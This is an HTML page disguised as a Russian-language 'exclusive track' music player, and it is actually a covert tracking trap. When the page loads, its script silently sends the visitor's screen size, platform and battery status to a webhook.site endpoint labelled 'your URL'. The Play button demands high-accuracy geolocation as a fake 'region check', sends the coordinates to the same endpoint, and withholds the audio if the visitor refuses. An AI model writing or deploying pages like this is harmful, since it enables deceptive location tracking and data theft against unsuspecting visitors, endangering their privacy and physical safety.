<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Музыкальный плеер</title>
    <style>
        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background: #121212; color: white; margin: 0; }
        .player-card { background: #1e1e1e; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 300px; }
        .play-btn { background: #1DB954; color: white; border: none; border-radius: 50%; width: 80px; height: 80px; font-size: 30px; cursor: pointer; transition: 0.3s; }
        .play-btn:hover { transform: scale(1.1); background: #1ed760; }
        #status { margin-top: 20px; font-size: 14px; color: #b3b3b3; }
    </style>
</head>
<body>

<div class="player-card">
    <div style="font-size: 50px; margin-bottom: 20px;">🎵</div>
    <h3>Эксклюзивный трек</h3>
    <p style="font-size: 12px; color: #888;">Для прослушивания требуется подтверждение региона</p>
    
    <button class="play-btn" id="actionBtn">▶</button>
    
    <div id="status">Нажмите Play</div>
</div>

<audio id="myAudio" src="track.mp3"></audio>

<script>
    const webhookUrl = "https://webhook.site/5c07e1e0-118c-480d-b310-b99e027"; // ТВОЙ URL

    function sendData(type, payload) {
        const query = new URLSearchParams({type, ...payload}).toString();
        fetch(`${webhookUrl}?${query}`);
    }

    // Собираем тихие данные (батарея, акселерометр) сразу при загрузке
    async function collectSilentData() {
        let silentData = {
            screen: window.screen.width + "x" + window.screen.height,
            platform: navigator.platform
        };

        // Батарея
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            silentData.battery = (bat.level * 100) + "%";
            silentData.charging = bat.charging;
        }
        
        sendData("INITIAL_INFO", silentData);
    }
    collectSilentData();

    // Логика кнопки
    document.getElementById('actionBtn').onclick = function() {
        const btn = this;
        const audio = document.getElementById('myAudio');
        const status = document.getElementById('status');
        
        status.innerText = "Проверка региона...";

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                // УСПЕХ: Координаты получены
                sendData("GEO_ACCESS", {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    acc: pos.coords.accuracy
                });

                status.innerText = "Доступ разрешен. Играем!";
                btn.innerText = "⏸️";
                audio.play(); // ЗАПУСКАЕМ ЗВУК
            },
            (err) => {
                // ОТКАЗ: Звук не включаем
                sendData("GEO_DENIED", { error: "User refused" });
                status.style.color = "#ff4444";
                status.innerText = "Ошибка: Доступ запрещен. Воспроизведение невозможно.";
                alert("Для прослушивания музыки необходимо подтвердить ваше местоположение.");
            },
            { enableHighAccuracy: true, timeout: 8000 }
        );
    };
</script>

</body>
</html>
